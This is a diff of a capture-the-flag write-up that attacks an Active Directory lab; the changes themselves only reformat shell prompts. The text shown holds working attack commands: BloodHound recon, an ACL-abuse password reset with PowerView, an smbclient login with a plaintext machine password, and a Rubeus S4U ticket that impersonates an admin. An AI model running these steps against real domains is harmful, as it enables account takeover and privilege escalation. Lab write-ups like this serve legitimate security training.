@@ -103,8 +103,8 @@ Bloodhound works by (1) collecting data using one of the available [collectors](
 In our case we used the [SharpHound](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html) to do the initial recon on the DC.
 
 ```powershell
-> Import-module sharphound.ps1
-> Invoke-BloodHound --CollectionMethod All --DomainController 5x.1xx.2xx.4x --OutputDirectory C:\temp\
+PS C:\> Import-module sharphound.ps1
+PS C:\> Invoke-BloodHound --CollectionMethod All --DomainController 5x.1xx.2xx.4x --OutputDirectory C:\temp\
 ```
 
 This creates a new data dump in `temp` which we can then import to Bloodhound, resulting in something similar to the following image:
@@ -172,8 +172,8 @@ By inspecting the **ACLs** of `writeradmin` we observe that the object `User1` (
 Testing this theory out, we can user PowerView again, with `Set-DomainUserPassword` feature.
 
 ```powershell
-> $writeradminNewPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-> Set-DomainUserPassword -Domain 5x.1xx.206.45 -Identity writeradmin -AccountPassword $writeradminNewPass -Credential $user1credObject
+PS C:\> $writeradminNewPass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\> Set-DomainUserPassword -Domain 5x.1xx.206.45 -Identity writeradmin -AccountPassword $writeradminNewPass -Credential $user1credObject
 ```
 As this command has no output on success, it is time to test out if it really worked. Trying to use ADExplorer with this account gives us a new view:
 
@@ -186,7 +186,7 @@ And we got ourself the first flag! And a Computer Account password for `App2$`.
 We can once again check if it is a valid credential or not:
 
 ```powershell
-> smbclient.py 'App2$':MdXShCaeOviiTzxk3g0G@51.137.206.45
+PS C:\> smbclient.py 'App2$':MdXShCaeOviiTzxk3g0G@51.137.206.45
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 Type help for list of commands
@@ -204,7 +204,7 @@ SYSVOL
 [-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
 ```
 
-... but we are not admins, yet!
+The user/pass works... but we are not admins, *yet*!
 
 ## Recon Stage #2
 
@@ -239,8 +239,8 @@ Additionally, to avoid any issue, both `oposec.local` and `app1.oposec.local` sh
 
 The first thing we need to do is to generate a RC4 hash of the password we have for `App2$`:
 
-```
-> .\Rubeus.exe hash /password:MdXShCaeOviiTzxk3g0G /user:App2 /domain:oposec.local
+```powershell
+PS C:\ .\Rubeus.exe hash /password:MdXShCaeOviiTzxk3g0G /user:App2 /domain:oposec.local
 
 Rubeus  v1.6.4
 
@@ -258,8 +258,8 @@ Rubeus  v1.6.4
 
 And then crafting a ticket:
 
-```
-> .\Rubeus.exe s4u /user:App2$ /rc4:EED530845242DD4013C0BEF37787EA33 /impersonateuser:app1admin /msdsspn:cifs/app1.oposec.local /ptt /output:ticket.txt /domain:oposec.local /dc:51.137.206.45
+```powershell
+PS C:\> .\Rubeus.exe s4u /user:App2$ /rc4:EED530845242DD4013C0BEF37787EA33 /impersonateuser:app1admin /msdsspn:cifs/app1.oposec.local /ptt /output:ticket.txt /domain:oposec.local /dc:51.137.206.45
 
  Rubeus v1.6.4
 
@@ -299,7 +299,7 @@ And then crafting a ticket:
 As it can be seen at the end Rubeus automatically adds the generated ticket to our localhost. This can be checked using `klist`:
 
 ```powershell
-> klist
+PS C:\> klist
 Current LogonId is 0:0x1f6bb
 Cached Tickets: (1)
 
